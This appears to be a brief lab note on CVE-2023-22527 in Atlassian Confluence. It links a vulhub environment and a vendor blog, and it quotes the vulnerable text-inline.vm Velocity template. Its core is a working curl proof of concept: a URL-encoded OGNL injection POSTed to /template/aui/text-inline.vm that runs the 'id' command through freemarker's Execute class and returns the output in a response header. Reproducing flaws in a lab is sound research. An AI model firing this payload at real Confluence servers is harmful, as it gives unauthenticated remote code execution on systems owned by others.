# CVE-2023-22527

https://github.com/vulhub/vulhub/blob/master/confluence/CVE-2023-22527/
https://projectdiscovery.io/blog/atlassian-confluence-ssti-remote-code-execution


```
curl -H "Content-Type: application/x-www-form-urlencoded" \
  -X POST http://localhost:8090/template/aui/text-inline.vm \
  -d "label=\u0027%2b#request\u005b\u0027.KEY_velocity.struts2.context\u0027\u005d.internalGet(\u0027ognl\u0027).findValue(#parameters.x,{})%2b\u0027&x=@org.apache.struts2.ServletActionContext@getResponse().setHeader('X-Cmd-Response',(new freemarker.template.utility.Execute()).exec({"id"}))"
```

/opt/atlassian/confluence/confluence/template/aui/text-inline.vm

``` vtl
#set( $labelValue = $stack.findValue("getText('$parameters.label')") )
#if( !$labelValue )
    #set( $labelValue = $parameters.label )
#end

#if (!$parameters.id)
    #set( $parameters.id = $parameters.name)
#end

<label id="${parameters.id}-label" for="$parameters.id">
$!labelValue
#if($parameters.required)
    <span class="aui-icon icon-required"></span>
    <span class="content">$parameters.required</span>
#end
</label>

#parse("/template/aui/text-include.vm")
```